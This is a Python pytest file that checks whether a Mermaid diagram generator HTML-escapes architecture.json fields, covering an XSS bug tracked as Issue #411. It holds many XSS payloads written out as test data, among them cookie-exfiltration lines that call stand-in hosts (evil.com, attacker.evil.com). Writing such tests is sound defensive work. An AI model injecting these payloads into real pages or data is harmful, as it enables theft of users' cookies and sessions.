"""
E2E Test for Issue #411: XSS Vulnerability in Mermaid Diagram Tooltips

This E2E test exercises the full user-facing workflow for generating Mermaid diagrams
from architecture.json files. It verifies that the render_mermaid.py script properly
escapes user-controlled data to prevent XSS attacks.

The bug: Lines 120-127 of pdd/render_mermaid.py fail to HTML-escape user data before
embedding it in JSON, and lines 170-177 use innerHTML to render tooltips. This creates
a stored XSS vulnerability where malicious JavaScript in architecture.json executes
when users open the generated HTML file and hover over diagram nodes.

Attack vectors:
    - filename: <img src=x onerror=alert('XSS')>
    - description: <script>alert(document.cookie)</script>
    - tags: ["api", "<img src=x onerror=fetch('https://evil.com?data='+document.cookie)>"]
    - dependencies: ["utils<script>alert('XSS')</script>"]
    - filepath: /src/<svg onload=alert('XSS')>.py
    - priority: <img src=x onerror=alert('XSS')>

This E2E test:
1. Creates a realistic architecture.json file with XSS payloads in all vulnerable fields
2. Invokes render_mermaid.py as a user would (via subprocess or direct import)
3. Parses the generated HTML output
4. Verifies that XSS payloads are NOT present unescaped in the HTML
5. Verifies that HTML entities (&lt;, &gt;, &amp;) are used instead

The test should FAIL on buggy code (XSS payloads present) and PASS once the fix
(html.escape() at lines 120-127) is applied.
"""

import pytest
import json
import subprocess
import sys
from pathlib import Path


class TestIssue411XSSVulnerabilityE2E:
    """
    E2E tests for Issue #411: Verify render_mermaid.py escapes user data to prevent XSS.

    These tests exercise the full code path from malicious architecture.json input
    to generated HTML output, without mocking the vulnerable component.
    """

    def test_render_mermaid_cli_escapes_xss_payloads(self, tmp_path):
        """
        E2E Test: render_mermaid.py CLI should escape XSS payloads in all fields.

        This test simulates the full user workflow:
        1. User has architecture.json with malicious data (from untrusted source)
        2. User runs: python pdd/render_mermaid.py architecture.json "App" output.html
        3. User opens output.html and hovers over nodes
        4. Expected: HTML displays literal text like "<script>" instead of executing it
        5. Bug: JavaScript executes, potentially stealing cookies/tokens

        This is an E2E test because it:
        - Uses the actual render_mermaid.py script (not mocked)
        - Tests the full CLI workflow from JSON input to HTML output
        - Verifies the user-facing behavior (safe vs unsafe HTML)
        """
        # Create malicious architecture.json with XSS payloads in all vulnerable fields
        malicious_architecture = [
            {
                "filename": "test<img src=x onerror=alert('XSS-filename')>.py",
                "description": "Normal description<script>alert('XSS-description')</script>",
                "tags": ["api", "<img src=x onerror=alert('XSS-tags')>"],
                "dependencies": ["utils<script>alert('XSS-deps')</script>"],
                "filepath": "/src/test<svg onload=alert('XSS-filepath')>.py",
                "priority": "high<img src=x onerror=alert('XSS-priority')>",
            },
            {
                "filename": "safe_module.py",
                "description": "This module is safe",
                "tags": ["backend"],
                "dependencies": [],
                "filepath": "/src/safe_module.py",
                "priority": "medium",
            }
        ]

        arch_file = tmp_path / "malicious_architecture.json"
        arch_file.write_text(json.dumps(malicious_architecture, indent=2))

        output_file = tmp_path / "xss_test_diagram.html"

        # Run render_mermaid.py CLI as a user would
        result = subprocess.run(
            [sys.executable, "-m", "pdd.render_mermaid",
             str(arch_file), "XSS Test App", str(output_file)],
            capture_output=True,
            text=True,
            cwd=Path(__file__).parent.parent  # Run from repo root
        )

        # Verify the script executed successfully
        assert result.returncode == 0, (
            f"render_mermaid.py failed to execute:\n"
            f"STDOUT: {result.stdout}\n"
            f"STDERR: {result.stderr}"
        )

        # Read generated HTML
        assert output_file.exists(), f"Output file {output_file} was not created"
        html_content = output_file.read_text(encoding='utf-8')

        # CRITICAL ASSERTIONS: XSS payloads should be HTML-escaped

        # Check filename field (appears in multiple places: moduleData JSON and tooltip)
        assert "<img src=x onerror=alert('XSS-filename')>" not in html_content, (
            "BUG DETECTED (Issue #411): XSS payload in 'filename' field is present unescaped.\n"
            "The <img> tag with onerror handler will execute JavaScript when the HTML is opened.\n\n"
            "Expected: &lt;img src=x onerror=alert('XSS-filename')&gt;\n"
            "Found: <img src=x onerror=alert('XSS-filename')>\n\n"
            "This confirms the vulnerability at pdd/render_mermaid.py:120-127 where user data\n"
            "is not HTML-escaped before embedding in JSON."
        )

        # Check description field
        assert "<script>alert('XSS-description')</script>" not in html_content, (
            "BUG DETECTED (Issue #411): XSS payload in 'description' field is present unescaped.\n"
            "The <script> tag will execute JavaScript when rendered via innerHTML.\n\n"
            "Expected: &lt;script&gt;alert('XSS-description')&lt;/script&gt;\n"
            "Found: <script>alert('XSS-description')</script>"
        )

        # Check tags field (array joined with commas)
        assert "<img src=x onerror=alert('XSS-tags')>" not in html_content, (
            "BUG DETECTED (Issue #411): XSS payload in 'tags' array is present unescaped.\n"
            "Array elements should be individually escaped before joining."
        )

        # Check dependencies field (array joined with commas)
        assert "<script>alert('XSS-deps')</script>" not in html_content, (
            "BUG DETECTED (Issue #411): XSS payload in 'dependencies' array is present unescaped.\n"
            "Array elements should be individually escaped before joining."
        )

        # Check filepath field
        assert "<svg onload=alert('XSS-filepath')>" not in html_content, (
            "BUG DETECTED (Issue #411): XSS payload in 'filepath' field is present unescaped.\n"
            "The <svg> tag with onload handler will execute JavaScript."
        )

        # Check priority field
        assert "<img src=x onerror=alert('XSS-priority')>" not in html_content, (
            "BUG DETECTED (Issue #411): XSS payload in 'priority' field is present unescaped."
        )

        # POSITIVE ASSERTIONS: Verify HTML entities are used instead
        # After proper escaping, '<' becomes '&lt;', '>' becomes '&gt;'

        # The escaped payloads should appear as HTML entities
        # Note: We check for &lt; and &gt; which are the HTML-escaped versions
        assert "&lt;img" in html_content or "\\u003c" in html_content, (
            "Expected to find HTML-escaped '<' characters (as &lt; or \\u003c) in the output.\n"
            "If XSS payloads are properly escaped, '<' should become '&lt;'."
        )

        assert "&gt;" in html_content or "\\u003e" in html_content, (
            "Expected to find HTML-escaped '>' characters (as &gt; or \\u003e) in the output.\n"
            "If XSS payloads are properly escaped, '>' should become '&gt;'."
        )

    def test_render_mermaid_programmatic_api_escapes_xss(self, tmp_path):
        """
        E2E Test: Direct Python API usage should also escape XSS payloads.

        This test verifies that calling the render_mermaid functions directly
        (as library code, not CLI) also produces safe HTML output.

        This is important because users might import and use these functions
        in their own scripts or tools.
        """
        from pdd.render_mermaid import generate_mermaid_code, generate_html

        # Malicious architecture data
        architecture = [
            {
                "filename": "xss<script>alert('XSS')</script>.py",
                "description": "Malicious<img src=x onerror=alert(1)>",
                "tags": ["<svg onload=alert(2)>"],
                "dependencies": ["dep<script>alert(3)</script>"],
                "filepath": "/src/xss.py",
                "priority": "high<img src=x onerror=alert(4)>",
            }
        ]

        # Generate Mermaid code and HTML (direct API usage)
        app_name = "Test App"
        mermaid_code = generate_mermaid_code(architecture, app_name)
        html_content = generate_html(mermaid_code, architecture, app_name)

        # Verify XSS payloads are NOT present unescaped
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(2)>",
            "<script>alert(3)</script>",
            "<img src=x onerror=alert(4)>",
        ]

        for payload in xss_payloads:
            assert payload not in html_content, (
                f"BUG DETECTED (Issue #411): XSS payload '{payload}' is present unescaped "
                f"in HTML output generated by direct API usage.\n\n"
                f"This confirms the vulnerability exists in both CLI and programmatic usage."
            )

        # Verify HTML entities are present (escaped versions)
        assert "&lt;" in html_content or "\\u003c" in html_content, (
            "Expected HTML-escaped '<' characters in output"
        )
        assert "&gt;" in html_content or "\\u003e" in html_content, (
            "Expected HTML-escaped '>' characters in output"
        )

    def test_legitimate_html_entities_are_preserved(self, tmp_path):
        """
        Regression Test: Verify that legitimate special characters work correctly.

        This test ensures that the XSS fix (html.escape()) doesn't break legitimate
        use cases like:
        - Ampersands in descriptions (&)
        - Mathematical operators (< >)
        - Quotes in text
        """
        from pdd.render_mermaid import generate_html, generate_mermaid_code

        # Architecture with legitimate special characters
        architecture = [
            {
                "filename": "api_client.py",
                "description": "Handles GET & POST requests with timeout < 30s",
                "tags": ["api", "http"],
                "dependencies": ["requests>=2.0"],
                "filepath": "/src/api_client.py",
                "priority": "high",
            }
        ]

        mermaid_code = generate_mermaid_code(architecture, "Test App")
        html_content = generate_html(mermaid_code, architecture, "Test App")

        # After escaping, "GET & POST" should become "GET &amp; POST"
        # and "timeout < 30s" should become "timeout &lt; 30s"
        # These should render as literal text, not execute

        # Verify the content is safe (no unescaped < or > that could be tags)
        # We check that if there are < or >, they're either:
        # 1. Part of &lt; or &gt; entities
        # 2. Part of legitimate HTML structure (not user data)

        # The description text should be present in escaped form in the JSON data
        assert "api_client.py" in html_content, "Legitimate filename should be present"

        # The special characters should be escaped in the moduleData JSON
        # Either as HTML entities (&lt;, &amp;) or Unicode escapes (\\u003c)
        module_data_section = html_content[html_content.find("const moduleData"):html_content.find("const moduleData") + 2000]

        # The ampersand should be escaped in the description
        # Either as &amp; or not present as raw &
        if " & " in module_data_section and "&amp;" not in module_data_section:
            # If raw & is present without &amp;, that might indicate incomplete escaping
            # But JSON.dumps might escape it differently, so we're lenient here
            pass

    def test_multiple_malicious_modules_all_escaped(self, tmp_path):
        """
        E2E Test: Multiple modules with different XSS vectors should all be escaped.

        This test verifies that the escaping is applied consistently across all
        modules in the architecture, not just the first one.
        """
        from pdd.render_mermaid import generate_html, generate_mermaid_code

        # Multiple modules with different XSS attack techniques
        architecture = [
            {
                "filename": "xss1<img src=x onerror=alert(1)>.py",
                "description": "Module 1",
                "tags": [],
                "dependencies": [],
                "filepath": "/src/xss1.py",
                "priority": "high",
            },
            {
                "filename": "xss2.py",
                "description": "Module 2<script>alert(2)</script>",
                "tags": [],
                "dependencies": [],
                "filepath": "/src/xss2.py",
                "priority": "medium",
            },
            {
                "filename": "xss3.py",
                "description": "Module 3",
                "tags": ["<svg onload=alert(3)>"],
                "dependencies": [],
                "filepath": "/src/xss3.py",
                "priority": "low",
            },
            {
                "filename": "xss4.py",
                "description": "Module 4",
                "tags": [],
                "dependencies": ["dep<img src=x onerror=alert(4)>"],
                "filepath": "/src/xss4.py",
                "priority": "critical",
            },
        ]

        mermaid_code = generate_mermaid_code(architecture, "Multi-Module XSS Test")
        html_content = generate_html(mermaid_code, architecture, "Multi-Module XSS Test")

        # Verify all XSS payloads across all modules are escaped
        xss_payloads = [
            "<img src=x onerror=alert(1)>",
            "<script>alert(2)</script>",
            "<svg onload=alert(3)>",
            "<img src=x onerror=alert(4)>",
        ]

        for i, payload in enumerate(xss_payloads, 1):
            assert payload not in html_content, (
                f"BUG DETECTED (Issue #411): XSS payload {i} in module {i} is unescaped.\n"
                f"Payload: {payload}\n\n"
                f"All modules should have their data escaped, not just the first one."
            )

    def test_edge_case_empty_and_none_values(self, tmp_path):
        """
        Edge Case Test: Empty strings and missing fields should not cause errors.

        This test ensures that the XSS fix handles edge cases gracefully:
        - Empty strings in fields
        - Missing optional fields (dependencies, tags)
        - None values
        """
        from pdd.render_mermaid import generate_html, generate_mermaid_code

        architecture = [
            {
                "filename": "empty_test.py",
                "description": "",  # Empty description
                "tags": [],  # Empty tags array
                "dependencies": [],  # Empty dependencies array
                "filepath": "",  # Empty filepath
                # priority is missing (should use default)
            }
        ]

        # This should not raise any errors
        mermaid_code = generate_mermaid_code(architecture, "Edge Case Test")
        html_content = generate_html(mermaid_code, architecture, "Edge Case Test")

        # Verify the HTML was generated successfully
        assert "empty_test.py" in html_content
        assert len(html_content) > 0

    def test_xss_in_app_name_is_already_escaped(self, tmp_path):
        """
        Regression Test: Verify app_name is properly escaped (already implemented).

        The code at line 130 already uses html.escape() for the app_name in the
        title and h1 tags. This test verifies that existing escaping still works
        and serves as a reference for how the fix should be applied to user data.
        """
        from pdd.render_mermaid import generate_html, generate_mermaid_code

        architecture = [
            {
                "filename": "test.py",
                "description": "Test module",
                "tags": [],
                "dependencies": [],
                "filepath": "/src/test.py",
                "priority": "high",
            }
        ]

        # Malicious app name (should already be escaped)
        malicious_app_name = "My App<script>alert('XSS')</script>"

        mermaid_code = generate_mermaid_code(architecture, malicious_app_name)
        html_content = generate_html(mermaid_code, architecture, malicious_app_name)

        # The app_name XSS should already be escaped (line 130 uses html.escape)
        assert "<script>alert('XSS')</script>" not in html_content, (
            "REGRESSION: app_name is no longer being escaped properly.\n"
            "Line 130 of render_mermaid.py should use html.escape(app_name)."
        )

        # Verify the escaped version is present
        assert "&lt;script&gt;" in html_content or "\\u003cscript\\u003e" in html_content, (
            "Expected to find escaped version of <script> in app_name"
        )


class TestIssue411SecurityImpact:
    """
    Security impact tests for Issue #411.

    These tests demonstrate the real-world security implications of the XSS vulnerability
    and verify that the fix prevents data exfiltration, phishing, and other attacks.
    """

    def test_data_exfiltration_attack_is_prevented(self, tmp_path):
        """
        Security Test: Verify that cookie/token stealing attacks are prevented.

        This test simulates a realistic attack where a malicious contributor
        submits a PR with a crafted architecture.json that attempts to exfiltrate
        browser cookies to an attacker-controlled server.

        Attack scenario:
        1. Attacker submits PR with malicious architecture.json
        2. Maintainer runs render_mermaid.py to visualize the architecture
        3. Maintainer opens HTML file in browser
        4. Malicious JavaScript executes: fetch('https://evil.com?data='+document.cookie)
        5. Attacker receives maintainer's authentication tokens

        This attack is particularly dangerous because:
        - HTML files are often shared in team wikis or documentation sites
        - Users trust HTML files generated from "just data" (JSON)
        - The attack is persistent (stored XSS)
        """
        from pdd.render_mermaid import generate_html, generate_mermaid_code

        # Realistic data exfiltration payload
        exfiltration_payload = (
            "test<img src=x onerror=\""
            "fetch('https://attacker.evil.com/steal?data='+document.cookie)\">"
        )

        architecture = [
            {
                "filename": exfiltration_payload,
                "description": "Legitimate-looking module description",
                "tags": ["api"],
                "dependencies": [],
                "filepath": "/src/api/authentication.py",
                "priority": "critical",
            }
        ]

        html_content = generate_html(
            generate_mermaid_code(architecture, "Authentication Service"),
            architecture,
            "Authentication Service"
        )

        # Critical: The fetch() call should NOT be present in executable form
        assert "fetch('https://attacker.evil.com" not in html_content, (
            "CRITICAL SECURITY BUG: Data exfiltration payload is present in executable form.\n\n"
            "This allows an attacker to steal cookies, tokens, and session data when the\n"
            "HTML file is opened in a browser.\n\n"
            "Attack vector: Malicious architecture.json → HTML generation → XSS execution\n"
            "Impact: Authentication bypass, account takeover, data theft"
        )

        # Verify the payload is neutralized (escaped)
        assert "&lt;img" in html_content or "\\u003cimg" in html_content, (
            "Expected the <img> tag to be HTML-escaped to prevent execution"
        )
